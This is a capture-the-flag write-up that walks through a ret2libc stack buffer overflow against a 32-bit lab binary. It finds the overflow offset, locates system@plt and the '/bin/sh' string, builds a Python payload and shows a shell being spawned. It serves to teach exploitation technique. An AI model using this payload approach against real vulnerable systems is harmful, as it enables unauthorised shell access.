# Ret2libc CTF Challenge — Write-up

## Challenge Overview

| Property | Value |
|----------|-------|
| Binary | ret2libc1 |
| Type | Stack Buffer Overflow |
| Protection | NX enabled |
| Technique | Ret2libc |
| Architecture | 32-bit i386 |

## Binary Analysis

### Protections

| Protection | Status |
|------------|--------|
| RELRO | Partial |
| Stack Canary | No |
| NX | Enabled |
| PIE | No |

### Vulnerability

```c
char buf1[100];
gets(buf1);  // No bounds checking!
```

## Exploit Development

### Step 1: Find Offset

```bash
PATTERN=$(python3 -c "from pwn import *; print(cyclic(200).decode())")
echo "$PATTERN" | gdb -q ./ret2libc1
```

**Result:** EIP = 0x62616164 = offset **112 bytes**

### Step 2: Find Addresses

```bash
objdump -d -j .plt ret2libc1 | grep system
# 0x08048460

strings -t x ret2libc1 | grep "/bin/sh"
# 0x8048720
```

### Step 3: Build Payload

```python
payload = b"A" * 112
payload += p32(0x08048460)  # system@plt
payload += p32(0xdeadbeef)  # fake return
payload += p32(0x8048720)   # /bin/sh
```

## Exploit Result

```
RET2LIBC >_<
$ id
uid=1000(fredrick) gid=1002(fredrick) groups=...
```

**Successfully spawned interactive shell.**

## Lessons Learned

1. 32-bit ret2libc uses stack for arguments
2. NX bypass via ret2libc — call existing functions
3. Cyclic pattern for offset discovery
4. system@plt already in binary = easy win
